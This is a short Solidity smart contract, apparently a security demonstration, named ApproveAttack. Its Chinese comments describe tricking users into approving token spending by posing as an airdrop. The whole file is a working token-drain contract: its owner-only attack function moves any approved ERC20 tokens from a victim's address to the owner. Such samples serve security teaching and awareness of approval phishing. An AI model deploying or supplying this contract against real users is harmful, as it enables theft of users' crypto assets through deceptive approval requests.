// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// 过度授信给第三方项目
// 伪装为空投项目诱惑用户授信给攻击合约
contract ApproveAttack is Ownable {
    using SafeERC20 for IERC20;

    function attack(address token, address from, uint256 value) public onlyOwner {
        IERC20(token).safeTransferFrom(from, owner(), value);
    }
}
